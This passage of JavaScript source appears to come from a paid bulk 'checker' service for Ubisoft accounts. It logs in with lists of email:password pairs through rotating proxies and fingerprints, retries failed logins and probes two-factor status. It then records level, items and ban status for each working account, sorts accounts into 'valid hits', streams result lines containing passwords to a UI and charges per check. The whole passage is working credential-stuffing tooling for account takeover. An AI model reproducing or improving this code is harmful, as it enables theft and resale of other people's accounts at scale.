  const { logout } = require('../auth');
  try {
    // Start the 2FA probe NOW, in parallel with the data fetch — both only need
    // the ticket, so it adds ~no wall-clock. Best-effort + time-bounded.
    const twoFaP = CHECK_2FA
      ? withTimeout(check2FA(session.ticket, session.sessionId, proxyUrl ? { proxyUrl } : {}), 4000, '2fa timeout').then(v => v, () => undefined)
      : Promise.resolve(undefined);
    // Login worked → fetch full data, RETRYING transient failures aggressively.
    // We REFUSE to return a half-result (no level / items / ban-status with
    // "Banned: ?") — those are useless to the operator. If data never loads even
    // after DATA_RETRIES, return 'retry' so the OUTER worker loop runs the
    // whole login again on a fresh proxy. The account is only ever recorded
    // when we have complete data, or dropped entirely (ERROR_NETWORK, no bill).
    const DATA_RETRIES = Math.max(0, Number(process.env.BULK_DATA_RETRIES) || 5);
    let playerData = null;
    for (let i = 0; i <= DATA_RETRIES; i++) {
      try {
        // bulk:true → native-Ubisoft-only fetch (no camoufox), scales to concurrency.
        playerData = await getPlayerData(session.userId, session.ticket, session.sessionId, session.appId, { bulk: true, forceRefresh: true });
        break;
      } catch (e) {
        if (i < DATA_RETRIES) { await new Promise(r => setTimeout(r, 300 + i * 400)); continue; }
        console.warn(`[bulk] data fetch failed for ${email} after ${DATA_RETRIES + 1} tries: ${e.message}`);
      }
    }
    // Couldn't load full data even after retries → bounce up to the outer retry
    // loop (different proxy / different fingerprint). NEVER record a partial.
    if (!playerData) return { outcome: 'retry' };
    const twoFactor = await twoFaP;
    if (twoFactor !== undefined) playerData.twoFactor = twoFactor;
    if (!fmt.isCaptureComplete(playerData)) return { outcome: 'retry' };
    return { outcome: 'success', playerData };
  } finally {
    // Release the session ticket back to Ubi's per-source quota. Runs whether
    // we returned 'success' or 'retry' — we're done with THIS ticket either way.
    // Fire-and-forget: don't block the worker, don't error the outcome.
    try { logout(session, proxyUrl); } catch {}
  }
}

// ── Live status for the UI ──────────────────────────────────────────────
function getStatus(jobId) {
  const dbRow = store.getJob(jobId);
  if (!dbRow) return null;
  const reg = registry.get(jobId);
  // Send last 20 finished lines so the UI can stream the latest.
  // We never echo passwords to the *response* — but the lines ARE the bulk
  // result format, which contains them. Caller decides what to surface.
  const recent = reg ? reg.recent.slice(-20) : [];
  const recentValid = reg ? reg.recentValid.slice(-20) : [];
  // Count of valid hits so far (live).
  return {
    id: dbRow.id,
    status: dbRow.status,
    total: dbRow.total,
    done: dbRow.done,
    counts: reg ? reg.counts : { valid: 0, vwi: 0, twofa: 0, banned: 0, invalid: 0, retry: 0, err: 0 },
    // Classified feed for the desktop CLI: email + mutually-exclusive status
    // (vwi|banned|valid|twofa|invalid|retry|err).
    feed: recent.map(line => ({
      email: line.split('|')[0].split(':')[0].trim(),
      status: fmt.feedStatus(line),
    })),
    chargedCents: dbRow.charged_cents,
    stoppedEarly: reg?.stoppedEarly || null,
    createdAt: dbRow.created_at,
    finishedAt: dbRow.finished_at,
    expiresAt: dbRow.expires_at,
    recent,
    recentValid,
    // Hit feed WITH each line's authoritative status so the UI colours by
    // quality (valid/vwi green, banned red, 2fa amber) instead of greening all.
    hits: recentValid.map(line => ({ line, status: fmt.feedStatus(line) })),
  };
}

// ── Ingest an UPLOADED result set (desktop checker → web bulk jobs) ─────────
// The desktop checker computes locally; on finish/stop it streams its plaintext
// results.txt here. We persist it as a normal, downloadable bulk job owned by
// the uploading user so it shows up in their website Bulk Jobs and can be
// downloaded (all / valid / invalid / vwi) like a server-run job. Constant
// memory: stream → temp → AES .enc, counting lines as we go.
async function ingestUpload(userId, readable, opts = {}) {
  const job = store.createJob(userId, 0);
  const tmp = path.join(JOBS_DIR, `${job.id}.upload.tmp`);
  const enc = path.join(JOBS_DIR, `${job.id}.enc`);
  let lines = 0, lastByteNL = true, bytes = 0;
  try {
    await new Promise((resolve, reject) => {
      const out = fs.createWriteStream(tmp);
      readable.on('data', (c) => {
        bytes += c.length;
        for (let i = 0; i < c.length; i++) if (c[i] === 0x0a) lines++;
        lastByteNL = c.length ? c[c.length - 1] === 0x0a : lastByteNL;
      });
      readable.on('error', reject);
      out.on('error', reject);
      out.on('finish', resolve);
      readable.pipe(out);
    });
    if (!lastByteNL && bytes > 0) lines++;            // trailing line w/o newline
    await fmt.encryptFileStream(tmp, enc);
    store.finalizeUploadedJob(job.id, lines, lines, enc);
    return { jobId: job.id, total: lines };
  } catch (e) {
    try { store.cancelJob(job.id); } catch {}
    try { fs.unlinkSync(enc); } catch {}
    throw e;
  } finally {
    try { fs.unlinkSync(tmp); } catch {}
  }
}

module.exports = {
  parseAccounts, startJob, cancelJob, getStatus, ingestUpload,
  inputPath, hasInput, computeUnchecked,
  PRICE_CENTS, PRICE_PER_CHECK_USD, MAX_LINES, OWNER_MAX_LINES, maxLinesFor, CONCURRENCY, concurrencyFor,
  PRICING_TIERS, priceForCount,
  PRICING_BRACKETS_PUBLIC, jobCostCents, jobCostUsd,
};
